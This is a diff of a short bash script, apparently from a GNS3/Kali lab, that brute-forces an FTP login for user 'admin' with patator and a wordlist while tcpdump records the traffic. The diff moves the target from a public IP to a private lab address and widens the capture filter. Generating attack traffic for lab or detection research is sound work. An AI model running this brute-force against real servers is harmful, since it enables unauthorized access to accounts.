@@ -1,6 +1,6 @@
 #!/bin/bash
 
-TARGET="205.174.165.68"
+TARGET="192.168.10.3"
 INTERFACE="eth0"
 USER="admin"
 BRUTE_FOLDER="/home/kali/GNS3/BruteForce"
@@ -14,7 +14,7 @@ fi
 
 echo "Using wordlist: $WORDLIST"
 echo "Starting tcpdump to $PCAP_FILE..."
-sudo tcpdump -i "$INTERFACE" dst "$TARGET" and port 21 -w "$PCAP_FILE" &
+sudo tcpdump -i "$INTERFACE" host "$TARGET" -w "$PCAP_FILE" &
 TCPDUMP_PID=$!
 
 patator ftp_login host="$TARGET" user="$USER" password=FILE0 0="$WORDLIST" -t 5
